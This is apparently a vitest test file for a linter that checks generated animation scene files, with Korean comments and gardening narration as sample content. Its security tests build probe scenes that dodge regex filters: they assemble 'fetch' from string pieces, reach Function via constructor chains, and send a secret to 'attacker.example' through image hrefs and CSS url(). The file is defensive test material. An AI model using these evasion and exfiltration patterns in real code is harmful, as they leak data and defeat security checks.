import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { SAFETY_NO_RENDER, lintScene, sceneSafety, sceneTexts, scanSource, textOverlap } from './sceneLint';
import { approxWords } from './sceneRules';
import { previewScene } from './scenePreview';
import { previewSceneFull } from './sceneFull';
import type { SceneJob } from './sceneJob';

const SENT = '블루베리는 산성 흙을 좋아해서, 피트모스를 절반 넘게 섞어 pH 4.5에서 5.5로 맞춥니다.';
const GOOD = `// S1 "${SENT}" — 머리 주석의 문장·/* 블록 */ 은 검사하지 않는다(문장 밖 말 '전정가위 사용법'도)
import React from 'react';
import { useCurrentFrame, useVideoConfig } from 'remotion';
import { SceneStage, type SceneProps, PotSection, SafeLabel, Gauge, atFromWords, ACCENT } from './_kit';

const L_ACID = '산성 흙';
const L_PEAT = '피트모스 절반↑';
const L_PH = 'pH 4.5~5.5';

export default function Scene({ durationInFrames, words }: SceneProps) {
  const f = useCurrentFrame();
  const { fps } = useVideoConfig();
  const tPh = atFromWords(words, '맞춥니다', fps, 124);
  /* 단면 — 피트모스가 절반선을 넘는다 */
  return (
    <SceneStage frames={durationInFrames} backdrop="sky">
      <PotSection id="s007-mix" x={540} y={560} layers={[{ material: 'peat', ratio: 0.55 }]} level={{ ratio: 0.5, label: L_PEAT }} />
      <rect fill="url(#s007-grad)" stroke="url(#kit-frame)" width={f} height={2} />
      <Gauge x={620} y={150} kind="ph" value={5} at={tPh} />
      <SafeLabel x={190} y={530} color={ACCENT}>{L_ACID}</SafeLabel>
      <SafeLabel x={720} y={78}>{L_PH}</SafeLabel>
    </SceneStage>
  );
}
`;

describe('scanSource', () => {
  it('주석을 걷고 문자열 조각을 뽑는다(템플릿 보간은 빼고)', () => {
    const r = scanSource("// 주석 '가'\nconst a = 'x'; /* '나' */ const b = `앞${'안'}뒤`;");
    expect(r.code).not.toContain('주석');
    expect(r.strings.map((s) => s.text)).toEqual(['x', '앞', '안', '뒤']);
  });
});

describe('lintScene — 장면 파일 빠른 검사', () => {
  it('키트 계약대로 쓴 장면은 통과(주석 속 문장 밖 말은 무시)', () => {
    expect(lintScene(GOOD, 's007', SENT)).toEqual([]);
    expect(sceneTexts(GOOD).filter((t) => t.label).map((t) => t.text)).toEqual(['산성 흙', '피트모스 절반↑', 'pH 4.5~5.5']);
  });
  it('결정성·외부 자원·import 위반', () => {
    const bad = GOOD.replace('const f = useCurrentFrame();', 'const f = useCurrentFrame() + Math.random() + Date.now();')
      .replace("from './_kit';", "from '../../illus/Kit2';\nimport x from 'https://evil.example/x.js';")
      .replace('<Gauge', '<img src="a.png" /><filter id="s007-f" /><Gauge');
    const p = lintScene(bad, 's007', SENT).join('\n');
    expect(p).toContain('Math.random');
    expect(p).toContain('Date');
    expect(p).toContain("import 금지 모듈: '../../illus/Kit2'");
    expect(p).toContain('외부 주소');
    expect(p).toContain('이미지');
    expect(p).toContain('<filter>');
  });
  it('id·url 참조는 장면 키 접두사(공용 kit-·k2- 참조만 예외)', () => {
    const p = lintScene(GOOD.replace('"s007-mix"', '"mix"').replace('url(#s007-grad)', 'url(#grad)'), 's007', SENT);
    expect(p).toContain("id 'mix' 에 접두사 's007-' 가 없음");
    expect(p.some((x) => x.includes('url(#grad)'))).toBe(true);
    expect(lintScene(GOOD, 's008', SENT).some((x) => x.includes("'s008-'"))).toBe(true);
  });
  it('문장 밖 문구·숫자, 라벨 수·길이', () => {
    const p = lintScene(GOOD.replace("'산성 흙'", "'석회 고토 비료'").replace("'pH 4.5~5.5'", "'pH 6.5'")
      .replace('<SafeLabel x={720}', '<SafeLabel x={1}>{\'피트모스\'}</SafeLabel><SafeLabel x={720}'), 's007', SENT).join('\n');
    expect(p).toContain('문장 밖 문구: "석회 고토 비료"');
    expect(p).toContain('문장에 없는 숫자: "pH 6.5" (6.5)');
    expect(p).toContain('라벨 4개');
    const long = lintScene(GOOD.replace("'산성 흙'", "'산성 흙을 좋아해서 섞어'"), 's007', SENT).join('\n');
    expect(long).toContain('라벨 너무 김');
  });
  it('기본 내보내기 하나·SceneStage 필수', () => {
    const p = lintScene(GOOD.replace('export default function', 'export function').replace(/SceneStage/g, 'Stage'), 's007', SENT);
    expect(p.some((x) => x.includes('기본 내보내기'))).toBe(true);
    expect(p).toContain('SceneStage 무대를 쓰지 않음');
  });
  it('textOverlap — 조사·띄어쓰기 달라도 문장 말이면 높다', () => {
    expect(textOverlap('물 빠짐 구멍', '바닥에 물 빠짐 구멍이 있는지')).toBe(1);
    expect(textOverlap('전정가위', SENT)).toBe(0);
    expect(textOverlap('30cm', SENT)).toBe(1); // 한글 없음 — 숫자는 따로 본다
  });
});

describe('approxWords — 글자 비례 단어 시각', () => {
  it('첫 단어 0초, 말하는 구간 안에서 단조 증가', () => {
    const w = approxWords('가나 다라마 바', 6);
    expect(w).toEqual([{ w: '가나', start: 0 }, { w: '다라마', start: 2 }, { w: '바', start: 5 }]);
    expect(approxWords('', 3)).toEqual([]);
    expect(approxWords('가', 0)).toEqual([]);
  });
});

describe('사람 손 금지(2026-10-23, 전체 화면 장면)', () => {
  const src = "import React from 'react';\nimport { FullStage, Hand } from './_kit';\nexport default function Scene() { return <FullStage frames={1}><Hand x={1} y={2} pose=\"hold\" /></FullStage>; }\n";
  it('noHands 면 Hand 부품을 문제로', () => {
    expect(lintScene(src, 's001', '묘목', { stage: 'FullStage', noHands: true }).some((p) => p.startsWith('사람 손(Hand) 금지'))).toBe(true);
    expect(lintScene(src, 's001', '묘목', { stage: 'FullStage' }).some((p) => p.startsWith('사람 손'))).toBe(false);
  });
});

// 보안 구문 검사(2026-10-25) — 글자 정규식을 빠져나간 탐침 장면(scratchpad/lintprobe)이 이제 떨어져야 한다.
describe('sceneSafety — 전역·네트워크·외부 주소 우회', () => {
  it('구조 분해로 꺼내는 금지 속성·계산 키도 막는다(10-25 보안 검토)', () => {
    const p = (body: string) => sceneSafety(`import React from 'react';\nexport default function Scene() { ${body} return <g />; }`);
    expect(p('const { constructor: C } = [];').join(' ')).toContain('구조 분해 금지: constructor');
    expect(p('const { constructor } = [];').join(' ')).toContain('구조 분해 금지: constructor');
    expect(p("const k = 'a'; const { [k]: C } = [];").join(' ')).toContain('구조 분해 계산 키 금지');
    expect(p('let C; ({ constructor: C } = []);').join(' ')).toContain('금지 속성 이름 키: constructor');
    expect(p('let C; [{ constructor: C }] = [[]];').join(' ')).toContain('금지 속성 이름 키: constructor');
    expect(p('let C; ({ a: { constructor: C } } = { a: [] });').join(' ')).toContain('금지 속성 이름 키: constructor');
    expect(p('let C; for ({ constructor: C } of [[]]) {}').join(' ')).toContain('금지 속성 이름 키: constructor');
    expect(p("let C; const k = 'a'; [{ [k]: C }] = [[]];").join(' ')).toContain('구조 분해 계산 키 금지');
    expect(p("const o = { __proto__: null };").join(' ')).toContain('금지 속성 이름 키: __proto__');
    expect(p("const k = 'w'; const st = { [k]: 1 };")).toEqual([]); // 보통 객체의 계산 키는 그대로
    expect(p('const { x, y } = { x: 1, y: 2 }; const [a, b] = [x, y]; const o = { prototype2: a + b };')).toEqual([]);
  });
  const PROBE = `import React from 'react';
import { FullStage, type FullSceneProps } from './_kit';
const K = 'abc123SECRET';
export default function Scene({ durationInFrames }: FullSceneProps) {
  const g = (self as any)['fe' + 'tch'];
  const F = [].constructor.constructor;
  void g; void F;
  return <FullStage frames={durationInFrames}><image href={'//attacker.example/' + K} width={1} height={1} /><rect style={{ fill: 'url(//attacker.example/x)' }} /></FullStage>;
}
`;
  it('탐침 장면은 lintScene 에서 보안 문제로 떨어진다', () => {
    const p = lintScene(PROBE, 's001', '흙을 돋운다', { stage: 'FullStage', urlPrefixes: ['a-', 'b-'], noRawText: true });
    const sec = p.filter((x) => x.startsWith('보안:')).join('\n');
    expect(sec).toContain('self');
    expect(sec).toContain("['fe' + 'tch']");
    expect(sec).toContain('.constructor');
    expect(sec).toContain('<image>');
    expect(sec).toContain("href 는 '#…' 글자만");
    expect(sec).toContain('//attacker.example/');
    expect(sec).toContain('url(//attacker.example/x)');
  });
  it('그 밖의 우회 — import()·globalThis·문자열 실행·Img·use href·String.fromCharCode·Reflect', () => {
    const p = (body: string) => sceneSafety(`import React from 'react';\nexport default function Scene() { ${body} }`);
    expect(p("void import('x'); return null;")).toContain('동적 import() 금지');
    expect(p('return globalThis;').join()).toContain('globalThis');
    expect(p("setTimeout('x()', 1); return null;").join()).toContain('setTimeout');
    expect(p('return String.fromCharCode(47, 47);').join()).toContain('fromCharCode');
    expect(p("return Reflect.get({}, 'a');").join()).toContain('Reflect');
    expect(p("return <use href={x} />;").join()).toContain("href 는 '#…' 글자만"); // <use> 는 되지만 주소는 '#…' 만
    expect(p("const o = { ['con' + 'structor']: 1 }; return o[`${'a'}b`];").join()).toContain('만든 문자열로 속성 접근');
    expect(p("const p = { href: '//x' }; return <g {...p} />;").join()).toContain("href 는 '#…' 글자만");
  });
  it('기존 장면의 정상 패턴은 통과 — 배열 계산 키·Math 키·지역 이름 top·url(#…) 템플릿·xmlns·펼침·비온이 action', () => {
    const ok = `import React from 'react';
import { FullStage, Bionee, type FullSceneProps } from './_kit';
const top = 120; const parent = { x: 1 };
export default function Scene({ durationInFrames, frames }: FullSceneProps & { frames?: number }) {
  const pts = [1, 2, 3]; const i = 1; const n = pts.length; const dash = { strokeDasharray: '4 4' };
  const a = pts[i + 1] + pts[(i + 1) % n] + pts[Math.min(n - 1, i)] + pts[n - 1] + top + parent.x + (frames ?? 0);
  return <FullStage frames={durationInFrames}><svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="s001-g"><stop offset={0} /></linearGradient></defs>
    <path d="M0 0" {...dash} style={{ top: a }} fill={\`url(#s001-g)\`} /><rect fill="url(#s001-g)" clipPath="url(#s001-c)" /></svg><Bionee action="point" /></FullStage>;
}
`;
    expect(sceneSafety(ok)).toEqual([]);
  });
});

// 10-25 리뷰 — 헛경보 줄이기(정상 패턴 통과)와 우회는 그대로 막기.
describe('sceneSafety — 헛경보 줄이기·우회는 그대로', () => {
  const p = (body: string, head = '') => sceneSafety(`import React from 'react';\n${head}\nexport default function Scene() { ${body} }`);
  it('정상 — url(${G})(G 가 #… const)·<use>/<textPath> href #…·수 함수 계산 키·경로 글자 이어 붙이기·라벨 글자 //', () => {
    expect(p('return <rect fill={`url(${G})`} stroke={`url(${H})`} />;', "const G = '#s001-g'; const key = 's001'; const H = `#${key}-h`;")).toEqual([]);
    expect(p('return <g><use href="#s001-leaf" /><text><textPath href="#s001-arc">가지</textPath></text><use xlinkHref={G} /></g>;', "const G = '#s001-g';")).toEqual([]);
    expect(p('const xs = [1, 2]; const clamp = (i: number) => Math.max(0, Math.min(1, i)); const s = \'1\'; return xs[clamp(3)] + xs[Number(s)] + xs[parseInt(s, 10)] + xs[xs.indexOf(2)];')).toEqual([]);
    expect(p("return <path d={'M 0 0 ' + 'L 10 10 ' + 'Z'} />;")).toEqual([]);
    expect(p("const L1 = '물 // 거름'; return <g>{L1}</g>;")).toEqual([]);
    expect(p('return <rect fill={`url( #s001-g)`} />;')).toEqual([]); // url( 뒤 공백 + #
  });
  it('우회는 그대로 — 이어 붙인 금지 이름·외부 주소, 문자열 메서드·String()·태그 템플릿 계산 키, #… 아닌 url(${…})', () => {
    expect(p("const k = 'con' + 'structor'; return k;").join()).toContain('금지 이름 글자 금지');
    expect(p("const k = `${'fe'}tch`; return k;").join()).toContain('금지 이름 글자 금지');
    expect(p("const k = 'constructor'; return k;").join()).toContain('금지 이름 글자 금지');
    expect(p("const u = '/' + '/evil.example/x'; return <g style={{ background: u }} />;").join()).toContain('외부 주소');
    expect(p("return <rect style={{ fill: 'url(' + '//evil.example/x)' }} />;").join()).toContain('외부 주소');
    expect(p("const u = '//evil.example'; return u;").join()).toContain('외부 주소'); // 밖이라도 //호스트 로 시작
    expect(p('return <rect fill={`url(${u})`} />;', "let u = '#a'; u = '//evil';").join()).toContain('외부 주소');
    expect(p('return <rect fill={`url(${G})`} />;', "const G = '#a'; function f(G: string) { return G; }").join()).toContain('외부 주소'); // 같은 이름이 다른 값으로도
    const o = 'const o: any = {}; const a = [1];';
    expect(p(`${o} return o[a.join('')];`).join()).toContain('만든 문자열로 속성 접근');
    expect(p(`${o} return o[String(1)];`).join()).toContain('만든 문자열로 속성 접근');
    expect(p(`${o} return o[String.raw\`x\`];`).join()).toContain('만든 문자열로 속성 접근');
    expect(p(`${o} return o['a'.concat('b')];`).join()).toContain('만든 문자열로 속성 접근');
    expect(p("return <image href=\"#x\" />;").join()).toContain('<image>'); // image 는 여전히 금지
  });
});

describe('미리보기 — 보안 검사에 걸린 장면은 브라우저에서 돌리지 않는다', () => {
  it('previewScene·previewSceneFull 모두 렌더 없이 문제만', async () => {
    const work = fs.mkdtempSync(path.join(os.tmpdir(), 'lf-safe-'));
    fs.writeFileSync(path.join(work, 's001.tsx'), "import React from 'react';\nexport default function Scene() { return <g>{String((self as any).name)}</g>; }\n");
    const job = { batch: 1, repo: path.resolve('.'), workDir: work, fps: 30, scenes: [{ key: 's001', file: 's001.tsx', narration: '흙', frames: 90, words: [] }] } as unknown as SceneJob;
    for (const r of [await previewScene(job, 's001'), await previewSceneFull({ ...job, stage: 'full', style: 'B' } as SceneJob, 's001')]) {
      expect(r.ok).toBe(false);
      expect(r.problems).toContain(SAFETY_NO_RENDER);
      expect(r.stills).toEqual([]);
    }
    expect(fs.existsSync(path.join(work, '.preview'))).toBe(false);
  });
});
